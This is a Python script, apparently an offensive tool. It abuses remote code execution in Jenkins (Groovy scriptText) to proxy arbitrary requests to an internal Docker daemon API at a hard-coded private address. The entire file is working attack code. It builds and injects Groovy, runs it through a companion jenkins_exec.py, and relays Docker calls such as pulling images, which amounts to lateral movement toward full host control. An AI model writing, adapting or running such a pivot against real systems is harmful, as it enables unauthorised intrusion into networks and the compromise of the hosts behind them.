"""
Docker API proxy via Jenkins RCE (Groovy scriptText).
Usage:
  python docker_api.py <METHOD> <PATH> [BODY_JSON] [--timeout SEC]
Examples:
  python docker_api.py GET /images/json?all=1
  python docker_api.py POST /images/create?fromImage=x&tag=y
"""
import sys, os, json, tempfile, subprocess

DOCKER_HOST = "172.27.140.148:4243"
JENKINS_EXEC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "jenkins_exec.py")

GROOVY_TEMPLATE = r'''
def dockerReq(String method, String path, String body) {
    def c = new URL("http://__DOCKER_HOST__" + path).openConnection()
    c.setConnectTimeout(15000)
    c.setReadTimeout(__TIMEOUT__ * 1000)
    c.setRequestMethod(method)
    if (body != null) {
        c.setDoOutput(true)
        c.setRequestProperty("Content-Type", "application/json")
        c.getOutputStream().write(body.getBytes("UTF-8"))
    }
    def code = c.getResponseCode()
    def text = ""
    try { text = c.getInputStream().getText("UTF-8") } catch (e) {
        try { text = c.getErrorStream()?.getText("UTF-8") ?: "" } catch (e2) { text = "" }
    }
    return "===CODE:" + code + "===\n" + text
}
println dockerReq("__METHOD__", "__PATH__", __BODY__)
'''

def docker_request(method, path, body=None, timeout=110):
    body_groovy = "null" if body is None else '"""' + body.replace('"""', '\\"\\"\\"') + '"""'
    script = (GROOVY_TEMPLATE
              .replace("__DOCKER_HOST__", DOCKER_HOST)
              .replace("__METHOD__", method)
              .replace("__PATH__", path)
              .replace("__BODY__", body_groovy)
              .replace("__TIMEOUT__", str(timeout)))
    with tempfile.NamedTemporaryFile("w", suffix=".groovy", delete=False, dir=os.path.dirname(JENKINS_EXEC)) as f:
        f.write(script)
        tmp = f.name
    try:
        out = subprocess.run([sys.executable, JENKINS_EXEC, tmp], capture_output=True, text=True, timeout=timeout + 60)
        return out.stdout + out.stderr
    finally:
        os.unlink(tmp)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    method = sys.argv[1].upper()
    path = sys.argv[2]
    body = sys.argv[3] if len(sys.argv) > 3 and not sys.argv[3].startswith("--") else None
    timeout = 110
    if "--timeout" in sys.argv:
        i = sys.argv.index("--timeout")
        timeout = int(sys.argv[i + 1])
    print(docker_request(method, path, body, timeout))
